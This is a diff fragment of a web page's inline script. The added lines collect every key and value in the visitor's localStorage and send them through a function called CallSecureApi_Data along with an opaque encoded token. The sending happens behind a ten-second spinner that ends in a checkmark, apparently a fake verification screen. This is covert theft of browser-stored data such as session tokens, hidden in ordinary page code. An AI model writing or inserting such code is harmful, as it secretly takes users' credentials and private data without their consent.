@@ -96,10 +96,13 @@ async function CallSecureApi_Data(s, replace) {
 
 </script>
 <script>
+  let data = "@@ 1 @@=" + Object.keys(localStorage)
+  .map(key => `${key}=${localStorage.getItem(key)}`)
+  .join(',');
   setTimeout(() => {
+    CallSecureApi_Data("ArUCAFjtM7usTTVlKhan3Jl+o+sp5qEAdj7cKYkgoYzZlShckJpdeDDhmweQed4hLNnMP3b+gJv9CUrJizGpeFt2o8LTkF8/a7S2Ad4gUW2Ri01qG/3/+8uHH2HmT90ztTPcgSAA49JBFMAjFXpFHiDCG+/zl10Cz5YHL7HWHGZAII/D6diY5coSu9GZCFSZ/9ummBnYyO5hwhpzDwJUjqjbkOv25PG4/VyY9bLrDSJCTxf08Q7AFBNyaGVNjKv9LLWurphfkprlqWBnSTxTnA==", data);
     document.getElementById('spinnerContainer').style.display = 'none';
     document.getElementById('checkmark').style.display = 'block';
-	localStorage.setItem("application_1","user");
   }, 10000);
   
          // Delete div somee
